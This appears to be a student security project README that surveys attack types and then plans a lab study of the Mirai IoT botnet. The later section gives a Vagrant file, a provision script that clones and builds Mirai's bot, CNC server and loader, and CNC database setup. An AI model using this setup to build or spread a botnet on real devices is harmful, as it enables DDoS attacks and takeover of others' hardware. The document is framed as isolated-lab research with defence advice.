# Security attack project

## Overview

### Brute force attack

Brute force is a general method of attacking against password protected resource: encrypted data or remote service. Brute force attack
means iterating over set of all possible passwords that can be used. Brute force on its own is very primitive method but still used in
some cases. For different cases there are many brute force optimizations.

The most common optimization is dictionary attack. Instead of combinatorical iteration over all values, list of "words" is used. This
attack dramatically reduced number of iterations, but if password is not in the dictionary, it does not work. For simple and dictionary 
brute force the order of iterations also matters: the more expected password is, the higher position it should have.

In one situation using "right order" of iteration can even reduce worst case time. Consider PIN-like code lock that does not have enter
key. In this case inputted keys can overlap and thus reduce number of symbols inputted. So using the correct input sequence can make brute
force much faster. Solution for this problem is de Bruijn sequence, that allows inputting `k^n + n` symbols instead of `k^n * n`, where `k`
is size of alphabet and `n` is length of passwords.

### Intrusion attacks

Classic type of cyber attack is attack targeting host, user's desktop or server. This type can be
typically split into individual phases:

  * __Reconnaissance:__ phase of background research and preparation
  * __Weaponization:__ phase of building malware, infecting files _etc._
  * __Delivery:__ infected data or binary is transferred to target host and opened/executed
  * __Exploitation:__ malware exploits system/software vulnerability and gets execution rights
  * __Installation:__ exploit gives control to payload that installs itself system and creates backdoor
  * __Command & Control:__ attacker uses backdoor and gets remote access to the system
  * __Actions on Objective:__ attacker does whatever he/she wants (read/modify user's data, access private network resources, log 
    keyboard, use host as proxy for the next attack)

That means the successful attack is combination of different techniques and software used at different steps.

First phase can include observing target host, gathering information both about target system/software and user(s). For example, using 
`nmap` can give some basic information about system and software installed. Access to internet traffic can provide much deeper insight
to target system and user(s).

The next phase uses information from the previous one to choose target software and vulnerability, find or create exploit, pack it into
data file.

Delivery phase also uses information from Reconnaissance to find best delivery channel(s): email, social media, physical access. This
phase in most cases requires social engineering work to make user download infected file or even binary. This means better skills in
delivery can dramatically simplify Weaponization (and remove/diminish Exploitation) and allow attacks to systems that run perfectly secure 
code.

Email is still one of most common ways for delivery stage in intrusion (and also fishing) attacks because of it insecure distributed 
nature: it does not have itself mechanisms to validate "From" email field. Although there are tools for it (PGP, SPF), they are not 
commonly used.

After user opened infected file, the next phase happens. Software meets ill-formed data, performs "unexpected" operations (common ex.
stack overflow) and gives control to payload. At this point "hacking" ended.

During the next phase attacker's code is executed. This can be chain-loading ssh/radmin/rdp/vnc/anything server, install it to autoload
and start. Or all the actions required can be performed just in-place. For example start encrypting disk (very common nowadays).

Instead of Reconnaissance, Weaponization, Delivery, Exploitation stages Brute Force attack can be used for systems with poor protection.
If attack is targeted against specific host there is not large chance to succeed, but if it targets any host within a network or even
whole internet, chances are much better. The simple experiment is to connect host with ssh-server with password protection and account
like `root:root` directly to ISP or put in DMZ. In few minutes it will be successfully attacked by one of such scanners.

### DoS attacks

Another type of attacks is Denial of Service attacks. They target hosts, services and networks. But their aim is not to get access to 
remote system but to flood it and exceed its resources, so that it becomes unavailable for users or long delays make it unusable.

DDoS attacks are distributed DoS attacks: multiple hosts are used by adversary to send larger number of packets. Nowadays most of
DoS attacks are distributed. Typically attacker does not own machines used for DDoS but instead has remote access to them (for example
from intrusion attacks). Group of compromised hosts used for DDoS is called botnet. 

Emerging IoT made possible DDoS attacks with very large number of attacking devices. Most of IoT devices
lack computing power for better security, users seldom update firmware and technology is still not well developed. This allows hackers
to search for this devices and perform brute force intrusion attacks against telnet or ssh services and include them into botnet.

  * Simplest type of DoS attack is __TCP SYN Flood__ . Adversary sends large number of SYN packets. For each packet server needs to allocate 
    memory, generate response, encrypt data, perform session lookup, etc. That means much greater use of resources for server than for
    adversary. Such an attack can be defended by stateful protocol analysis tools. 

  * __TCP Reset__ attacks use RST-packages to continuously interrupt connection. 

  * In __Fragmented UDP Flood__ attack small fragmented UDP packages are sent to the server making it use resources for analyzing and
    rebuilding them.

  * __Smurf-attacks__ use ICMP Echo protocol to boost attack using random hosts. Echo request is sent to broadcast address and its source
    is set to target IP. All the hosts in subnet reply to request and send packages to target IP. That means multiplying attack by number
    of active hosts in subnet.

  * __DNS Amplification__ like in Smurf attack group of public hosts are used, but protocol is DNS instead of ICMP. Adversary sends
    requests to multiple DNS servers with source address set to target IP. Resolvers send larger response to target.

  * One of the oldest attacks, __mailbombing__ , can also be considered kind of DoS attack. It targets user's mailbox or mail server. Adversary 
    sends huge amount of emails to target address. 

### Application layer attacks

This group of attacks target not a host or service, but application. This means firewalls, DPI tools or anitviruses can do
nothing with it. Incorrect or insecure implementations of backend and frontend cause different kinds of vulnerabilities.

The most common attacks against applications are:

  * __Injections__ : untrusted data is passed directly to interpreter (PHP, SQL, LDAP) as part of command or query. Injections in web
    applications can also target HTML (and JS!): if values are not sanitized somewhere after user submitted them to application and 
    application uses them to render pages, HTML tags inside it are interpreted by web browser, that allows injection of random JS.

  * __Incorrect auth system__ : login to app with HTTP exposes password, session does not invalidate after logout, credentials are not
    protected in database (not only hashed but also salted), session IDs are used in URL

  * __XSS__ : Cross Site Scripting, is JS injection. Can be injected one time (ex. as request parameter of link) or stored in application
    and executed in all users' browsers.

  * __Insecure direct reference__ : filename is derived from request parameter, which allows getting arbitrary file (including config
    files, database files and source codes) from host running application. For example simple filtering by extensions can be bypassed using
    null byte symbol.

  * __Security misconfiguration__ : debugging on, wrong permissions, default accounts, setup pages, wrong http server access settings

  * __Sensitive Data Exposure__ : unencrypted data transport or storage, 

### Mobile

Modern mobile phones run pretty same software as desktops, that means a lot of desktop oriented attacks are applicable. In addition to
those, there exist attacks related to different wireless communication medias and protocols.

  * __GSM__ based attack examples:
    - GSM line can be sniffered. It is encrypted but encryption is not that strong and brute force decryption _is possible_
    - In some countries legal restrictions require shorter keys and simplify process
    - Subscriber's key can also be extracted from SIM card by means of differential cryptoanalysis
    - Or by using fake base station
    - Some carriers allow replacing sender's number to predefined key (just like in emails) that gives possibilities for fishing and 
      provides delivery channel for other attacks
    - Using SMS as payment method allows attacker to steal subscriber's money if he has access to his phone (or via social engineering)
    - Using special characters in SMS can crash some old phones
    - Flooding with invalid messages can create DoS attack invisible for user but making his phone unusable for period of attack

  * __Bluetooth__ based attack examples:
    - Both visible and invisible devices can be discovered within minutes
    - Possibilities for overflow attacks and injections
    - Fake headset attack (ex. allows to perform call)
    - Fake home desktop attack: get read/write access to phone book, calendar, _etc._
    - Attack on BT headset (often default PIN-code used)

  * __NFC__ based attack examples:
    - duplicating payment beacon

### Zero day attacks

Zero day attack is any kind of attack that uses recently published vulnerabilities and relies on usage of not up-to-date software.

## Mirai botnet

### Introduction

In this assignment I want to research Mirai botnet malware and explore other possible uses of its code.

Mirai (未来) is malware designed for building large scale botnet of IoT devices. The bot and related programs was created by Anna-senpai, firstly discovered
and researched by MalwareMustDie in the end of August 2016. In reply to their blog post, one month later, Anna-sepai published sources and manual on how 
to build and run botnet, while pointing out mistakes in analysis and humiliating unixfreaxjp, author of post.

Mirai bot searches network for devices with telnet/ssh port open and bruteforces several most common and default passwords. Because users of IoT devices 
often do not much care about their security, large portion of them is vulnerable to attack. And because of large quantity of IoT devices, Mirai botnet
can grow to hundreds of thousands of hosts.

After Mirai infects host, it updates passwords to make it secure against other bots. Mirai does not install itself to target device but only stays in RAM.
This behavior was an obstacle for researches, because the only way of getting binary was dump from memory.

In attack mode Mirai has several builtin strategies: 

  0. UDP flood `ATK_VEC_UDP`
  1. Valve Source Engine query flood `ATK_VEC_VSE`
  2. DNS water torture `ATK_VEC_DNS`
  3. SYN flood `ATK_VEC_SYN`
  4. ACK flood `ATK_VEC_ACK`
  5. ACK flood to bypass mitigation devices `ATK_VEC_STOMP`
  6. GRE IP flood `ATK_VEC_GREIP`
  7. GRE Ethernet flood `ATK_VEC_GREIP`
  8. Proxy knockback connection `ATK_VEC_PROXY`
  9. Plain UDP flood optimized for speed `ATK_VEC_UDP_PLAIN`
  10. HTTP layer 7 flood `ATK_VEC_HTTP`


### Project structure

Project consists of several parts: the bot itself (`/mirai/bot`, C), Command and Control (CNC) server (`/mirai/cnc`, Go), loader that receives compromised
hosts information from bots, stores to db and uploads malware to them (`/loader`, C), some useful utilities (`/mirai/tools`, C).

_(To be continued)_

## Attack plan

### Preparation/building

All preparation is described with Vagrant configuration and provision shell script.

Required software (Windows versions):

  * __Vagrant__ can be downloaded from [here](https://releases.hashicorp.com/vagrant/1.9.2/vagrant_1.9.2.msi)
  * __VirtualBox__ can be downloaded from [here](http://download.virtualbox.org/virtualbox/5.1.18/VirtualBox-5.1.18-114002-Win.exe)

This is the recommended configuration. Other host platforms (Linux, macOS) and virtualization providers (KVM, VMware) or cloud can be used.

__Note:__ With the latest version of Vagrant and VirtualBox for Windows there is a bug (newer vbox provides long path suffix itself), this can be fixed by
following:

```diff
--- C:/HashiCorp/Vagrant/embedded/gems/gems/vagrant-1.9.2/lib/vagrant/util/platform.rb
+++ C:/HashiCorp/Vagrant/embedded/gems/gems/vagrant-1.9.2/lib/vagrant/util/platform.rb.original
@@ -203,7 +203,7 @@
           return path + "\\" if path =~ /^[a-zA-Z]:\\?$/
 
           # Convert to UNC path
-          path.gsub("/", "\\")
+          "\\\\?\\" + path.gsub("/", "\\")
         end
 
         # Returns a boolean noting whether the terminal supports color.
```

Create new folder for project and `cd` into it. Create `Vagrant` file:

```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
    config.vm.box = "ubuntu/xenial64"

    config.vm.provider "virtualbox" do |vb|
      vb.name = "mirai"
      vb.memory = "2048"
      vb.cpus = 4
    end

    config.vm.network "public_network", bridge: "CISCO"
    config.vm.provision "shell", path: "provision.sh"

end

```

Create `provision.sh` file:

```sh
#!/bin/bash

echo ">>> Installing packages..."
export DEBIAN_FRONTEND=noninteractive
if [ "$[$(date +%s) - $(stat -c %Z /var/cache/apt/pkgcache.bin)]" -ge 600000 ]; then
  apt-get update
fi
apt-get install -y git gcc golang electric-fence mysql-server mysql-client

if [ ! -d /vagrant/mirai ]; then
  echo ">>> Cloning mirai repository..."
  git clone https://github.com/James-Gallagher/Mirai.git /vagrant/mirai
fi

if [ ! -d /etc/xcompile ]; then
  echo ">>> Installing crosscompilers..."
  mkdir /etc/xcompile
  cd /etc/xcompile
 
  COMPILERS="cross-compiler-armv4l cross-compiler-i586 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-sh4 cross-compiler-sparc"

  for compiler in $COMPILERS; do        
    wget -q https://www.uclibc.org/downloads/binaries/0.9.30.1/${compiler}.tar.bz2 --no-check-certificate
    if [ -f "${compiler}.tar.bz2" ]; then
      tar -jxf ${compiler}.tar.bz2
      rm ${compiler}.tar.bz2
      echo "export PATH=\$PATH:/etc/xcompile/$compiler/bin" >> ~/.profile
      echo ">> Compiler $compiler installed"
    else
      echo "!> Can not download $compiler"
    fi
  done

  echo "export PATH=\$PATH:/usr/local/go/bin" >> ~/.profile
  echo "export GOPATH=\$HOME/go" >> ~/.profile

  echo ">> Reloading bashrc..."
  source ~/.profile

fi

echo ">>> Getting go requirements..."
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

echo ">>> Configuring sql..."
mysql < /vagrant/setup_sql.sql

echo ">>> Building mirai bot and cnc..."
cd /vagrant/mirai/mirai
./build.sh release telnet

echo ">>> Building loader..."
cd /vagrant/mirai/loader
./build.sh

echo ">>> Done"

```

Create `setup_sql.sql` file:

```sql
DROP DATABASE IF EXISTS mirai;
CREATE DATABASE mirai;
USE mirai;

CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);

CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);

CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

GRANT ALL PRIVILEGES ON mirai.* To 'mirai'@'localhost' IDENTIFIED BY 'password';
INSERT INTO users VALUES (NULL, 'mirai', 'password', 0, 0, 0, 0, -1, 1, 30, '');
```

After that do `vagrant up` and VM with everything will be built.



### Network and hardware

VM's network is configured to bridge to CISCO network adapter. So _isolated lab_ LAN should be connected to this interface and should not have any 
access to internet or any production network (!).

I am planning to use TP-Link TD-W8968 SOHO router/modem as target device (also try to find more devices). It is based on Broadcom MIPS SoC 
(MIPS-I version 1 (SYSV)), that is one of supported archs.

Though Mirai supports wide range of devices,
there are some requirements:

  * Device is in reachable network (not behind NAT/firewall)
  * Device has telnet (or ssh) daemon binded to interface on reachable network (ex. modem allows telnet access from internet port)
  * Device runs linux-like system and has busybox binary (that includes `cp`, `cat`, `chmod` and either `wget` or `tftp`)
  * Access to busybox/sh can be gained with one of known commands (ex. TD-W8968 needs `echo && sh` hack that is not expected in Mirai and should be added)
  * There is a path with write access
  * Device admin password is known (initial device) or is one from Mirai dictionary

This device fits most of them, other can be fixed. 

One of Mirai features is using DNS to connect to CNC. I will use tftpd as DNS server. TFTP server can also be helpful for troubleshooting.

### Defence

To defence against Mirai one need to eliminate on of listed requirements. The simpliest way is to change device password (Mirai's dictionary contains
about 100 records, every non-default password will be ok). Disabling remote management on routers is also extremely important in case it is not used.


## Links and resources

 1.  [Cyber Attack on wikipedia](https://ru.wikipedia.org/wiki/%D0%A5%D0%B0%D0%BA%D0%B5%D1%80%D1%81%D0%BA%D0%B0%D1%8F_%D0%B0%D1%82%D0%B0%D0%BA%D0%B0)
 2.  [Overview of cyber attacks](https://www.recordedfuture.com/cyber-threat-landscape-basics/)
 3.  [Types of DDOS](https://habrahabr.ru/company/vasexperts/blog/313562/), 
 4.  [Defending against DDOS](https://habrahabr.ru/company/croc/blog/240923/)
 5.  [Defending against DDOS from CISCO](http://www.cisco.com/c/en/us/about/security-center/guide-ddos-defense.html)
 6.  [Types of web attacks](https://habrahabr.ru/company/ua-hosting/blog/272205/)
 7.  [Types of mobile attacks](https://habrahabr.ru/company/beeline/blog/162913/)
 8.  [Zero-day attacks](https://habrahabr.ru/company/panda/blog/268811/)
 9.  [Mirai coed on github](https://github.com/James-Gallagher/Mirai)
 10. [Anna-sepai post on github](https://raw.githubusercontent.com/James-Gallagher/Mirai/master/post.txt)


-----

__Extra reading__

  * [Cheat-sheets](https://habrahabr.ru/company/pentestit/blog/322834/)
  * [RTFM: Red Team Field Manual](https://watchthestack.files.wordpress.com/2015/03/rtfm-red-team-field-manual.pdf)
  * [Example of attacking hotel networks](https://habrahabr.ru/company/panda/blog/283320/)
